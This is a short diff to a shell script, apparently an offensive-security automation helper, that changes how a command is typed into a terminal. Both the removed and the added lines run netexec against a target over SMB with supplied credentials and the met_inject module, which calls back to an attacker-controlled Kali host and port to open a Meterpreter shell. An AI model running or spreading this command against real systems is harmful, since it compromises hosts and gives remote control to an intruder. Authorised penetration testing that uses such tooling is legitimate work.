@@ -18,6 +18,6 @@ USERNAME=${form_data["username"]}
 PASSWORD=${form_data["password"]}
 SHELL_PORT=${form_data["shell_port"]}
 
-paste_command "netexec smb ${IP} -u '${USERNAME}' -p '${PASSWORD}' --local-auth -M met_inject -o SRVHOST=${KALI_IP} SRVPORT=${SHELL_PORT}"
-xdotool key Return
+execute_command "netexec smb ${IP} -u '${USERNAME}' -p '${PASSWORD}' --local-auth -M met_inject -o SRVHOST=${KALI_IP} SRVPORT=${SHELL_PORT}"
+create_new_line
  
